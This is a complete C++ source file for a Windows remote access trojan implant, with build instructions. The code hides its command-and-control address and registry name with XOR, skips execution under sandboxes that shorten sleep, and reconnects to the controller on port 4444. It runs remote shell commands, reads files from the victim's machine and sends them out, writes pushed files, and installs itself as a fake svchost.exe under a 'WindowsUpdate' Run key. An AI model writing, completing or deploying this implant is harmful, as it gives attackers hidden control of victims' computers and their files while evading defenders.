// language: C++17, file: agent.cpp, target: Windows 11, MSVC
// reverse-TCP RAT implant — reconnect loop, XOR-obfuscated strings, sandbox sleep check,
// pipe-captured shell, file upload/download, HKCU registry persistence
//
// build: cl /std:c++17 /W0 /O2 /MT /subsystem:windows agent.cpp /link ws2_32.lib shell32.lib advapi32.lib
//
// XOR key K=0x5A. Re-encode C2 IP:
//   python3 -c "k=0x5A;[print(hex(ord(c)^k)+',',end='') for c in '1.2.3.4']"
// Replace g_c2_enc[] before build.

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <cstdint>
#include <cstring>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// --- obfuscation -------------------------------------------------------
static constexpr uint8_t K = 0x5A;

static std::string xd(const uint8_t* b, size_t n) {
    std::string s(n, '\0');
    for (size_t i = 0; i < n; ++i) s[i] = static_cast<char>(b[i] ^ K);
    return s;
}

// "192.168.1.100" XOR K  — replace with actual C2 IP
static const uint8_t g_c2_enc[]  = { 0x6b,0x63,0x68,0x74,0x6b,0x6c,0x62,0x74,0x6b,0x74,0x6b,0x6a,0x6a };
// "WindowsUpdate" XOR K  — registry value name
static const uint8_t g_reg_enc[] = { 0x0d,0x33,0x34,0x3e,0x35,0x2d,0x29,0x0f,0x2a,0x3e,0x3b,0x2e,0x3f };

static constexpr uint16_t C2_PORT = 4444;

// --- protocol ----------------------------------------------------------
enum : uint32_t {
    MSG_CMD      = 0x01,  // server->agent: execute shell command
    MSG_OUTPUT   = 0x02,  // agent->server: command stdout/stderr
    MSG_DOWNLOAD = 0x03,  // server->agent: request file from agent
    MSG_FILE     = 0x04,  // agent->server: file contents
    MSG_UPLOAD   = 0x05,  // server->agent: push file to agent
    MSG_PERSIST  = 0x06,  // server->agent: install persistence
    MSG_STATUS   = 0x07,  // agent->server: text status
    MSG_EXIT     = 0xFF   // server->agent: terminate
};

static bool send_msg(SOCKET s, uint32_t type, const void* data, uint32_t len) {
    uint32_t hdr[2] = { htonl(type), htonl(len) };
    if (send(s, reinterpret_cast<const char*>(hdr), 8, 0) != 8) return false;
    const char* p = static_cast<const char*>(data);
    uint32_t rem = len;
    while (rem) {
        int r = send(s, p, rem, 0);
        if (r <= 0) return false;
        p += r; rem -= r;
    }
    return true;
}

static bool recv_all(SOCKET s, void* buf, uint32_t len) {
    char* p = static_cast<char*>(buf);
    while (len) {
        int r = recv(s, p, len, 0);
        if (r <= 0) return false;
        p += r; len -= r;
    }
    return true;
}

static bool recv_msg(SOCKET s, uint32_t& type, std::vector<uint8_t>& data) {
    uint32_t hdr[2];
    if (!recv_all(s, hdr, 8)) return false;
    type = ntohl(hdr[0]);
    uint32_t len = ntohl(hdr[1]);
    if (len > 64u * 1024 * 1024) return false;
    data.resize(len);
    return len == 0 || recv_all(s, data.data(), len);
}

// --- capabilities ------------------------------------------------------
static std::string exec_cmd(const std::string& cmd) {
    HANDLE hr, hw;
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    if (!CreatePipe(&hr, &hw, &sa, 0)) return "[pipe fail]";
    SetHandleInformation(hr, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb         = sizeof(si);
    si.hStdOutput = hw;
    si.hStdError  = hw;
    si.dwFlags    = STARTF_USESTDHANDLES;

    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /c " + cmd;
    BOOL ok = CreateProcessA(nullptr, full.data(), nullptr, nullptr,
                             TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hw);
    if (!ok) { CloseHandle(hr); return "[CreateProcess failed]"; }

    std::string out;
    char buf[4096];
    DWORD rd;
    while (ReadFile(hr, buf, sizeof(buf), &rd, nullptr) && rd)
        out.append(buf, rd);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hr);
    return out.empty() ? "[no output]" : out;
}

static bool install_persist() {
    char cur[MAX_PATH];
    GetModuleFileNameA(nullptr, cur, MAX_PATH);

    char ad[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, ad);
    std::string dir = std::string(ad) + "\\Microsoft";
    std::string dst = dir + "\\svchost.exe";

    CreateDirectoryA(dir.c_str(), nullptr);
    if (!CopyFileA(cur, dst.c_str(), FALSE)) return false;

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return false;
    std::string val = xd(g_reg_enc, sizeof(g_reg_enc));
    RegSetValueExA(hk, val.c_str(), 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(dst.c_str()),
                   static_cast<DWORD>(dst.size()) + 1);
    RegCloseKey(hk);
    return true;
}

// sandboxes often shorten Sleep() to rush through execution
static bool not_sandboxed() {
    DWORD t0 = GetTickCount();
    Sleep(10000);
    return (GetTickCount() - t0) >= 9000;
}

// --- session dispatch --------------------------------------------------
static void handle_session(SOCKET s) {
    uint32_t type;
    std::vector<uint8_t> data;

    while (recv_msg(s, type, data)) {
        switch (type) {

        case MSG_CMD: {
            std::string cmd(data.begin(), data.end());
            std::string out = exec_cmd(cmd);
            send_msg(s, MSG_OUTPUT, out.data(), static_cast<uint32_t>(out.size()));
            break;
        }

        case MSG_DOWNLOAD: {
            std::string path(data.begin(), data.end());
            HANDLE hf = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                    nullptr, OPEN_EXISTING, 0, nullptr);
            if (hf == INVALID_HANDLE_VALUE) {
                std::string err = "[file not found]";
                send_msg(s, MSG_STATUS, err.data(), static_cast<uint32_t>(err.size()));
            } else {
                DWORD fsz = GetFileSize(hf, nullptr);
                std::vector<uint8_t> fbuf(fsz);
                DWORD rd;
                ReadFile(hf, fbuf.data(), fsz, &rd, nullptr);
                CloseHandle(hf);
                fbuf.resize(rd);
                send_msg(s, MSG_FILE, fbuf.data(), static_cast<uint32_t>(fbuf.size()));
            }
            break;
        }

        case MSG_UPLOAD: {
            // payload layout: [4-byte path_len (net)][path][file_data]
            if (data.size() < 4) break;
            uint32_t plen = ntohl(*reinterpret_cast<uint32_t*>(data.data()));
            if (4 + plen > data.size()) break;
            std::string path(reinterpret_cast<char*>(data.data()) + 4, plen);
            const uint8_t* fdata = data.data() + 4 + plen;
            DWORD flen = static_cast<DWORD>(data.size() - 4 - plen);
            HANDLE hf = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                    CREATE_ALWAYS, 0, nullptr);
            std::string status;
            if (hf == INVALID_HANDLE_VALUE) {
                status = "[write failed]";
            } else {
                DWORD wr;
                WriteFile(hf, fdata, flen, &wr, nullptr);
                CloseHandle(hf);
                status = "[ok]";
            }
            send_msg(s, MSG_STATUS, status.data(), static_cast<uint32_t>(status.size()));
            break;
        }

        case MSG_PERSIST: {
            bool ok = install_persist();
            std::string status = ok ? "[persist ok]" : "[persist failed]";
            send_msg(s, MSG_STATUS, status.data(), static_cast<uint32_t>(status.size()));
            break;
        }

        case MSG_EXIT:
            closesocket(s);
            ExitProcess(0);

        default:
            break;
        }
    }
}

// --- entry point -------------------------------------------------------
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (!not_sandboxed()) ExitProcess(0);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    std::string c2_ip = xd(g_c2_enc, sizeof(g_c2_enc));

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) { Sleep(5000); continue; }

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(C2_PORT);
        inet_pton(AF_INET, c2_ip.c_str(), &addr.sin_addr);

        if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == 0)
            handle_session(s);

        closesocket(s);
        Sleep(5000);
    }
}
